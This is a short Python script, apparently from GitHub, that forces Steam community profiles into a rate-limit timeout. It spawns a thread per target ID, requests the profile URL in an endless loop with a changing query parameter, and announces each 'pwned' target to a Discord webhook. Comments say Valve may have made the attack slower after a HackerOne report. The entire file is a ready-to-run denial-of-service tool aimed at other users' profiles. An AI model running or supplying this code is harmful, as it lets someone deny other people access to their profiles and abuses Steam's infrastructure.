#github.com/abbe

#hmm... as of posting (check commit dates),
#due to changes from Valve after the H1 report (unconfirmed and just speculation), this will take longer to do
#previously, it was in effect every ~10 requests for a few seconds then repeated.
#no idea if this is just temporary or something, either way posting this for informative purposes.

target_ids = [ "qqq", "eee", "rrr", "ttt" ] #add IDs here

import threading
import requests
import json

def post_to_webhook(custom_message):
    try:
        data = {
            "username": "Steam Force Profile Timeout"
        }
        data["embeds"] = [
            {
                "description": custom_message,
                "title": "Steam Force Profile Timeout"
            }
        ]
        req = requests.post("https://discord.com/api/webhooks/", json = data) #put webhook here
        if req.status_code == 200:
            return True
        
        return False
    except:
        return False #why not?

def do_timeout(target):
    rate_limited_profile = False
    i = 0
    while True:
        req = requests.get("https://steamcommunity.com/id/{}/?asdf={}".format(target, i))
        i += 1
        if req.text.find("loading profile data") != -1:
            print("\n\nTIMEOUT'D " + target + "\n\n")
            if rate_limited_profile == False:
                if post_to_webhook(target + " got pwned by force timeout"):
                    print("Posted to webhook for " + target)
                    rate_limited_profile = True
                else:
                    print("Failed to post to webhook for " + target)
        else:
            print("Sent successful request to " + target + ", attempting again until timeout\n")
        
for target_id in target_ids:
    t = threading.Thread(target = do_timeout, args = (target_id,))
    t.start()
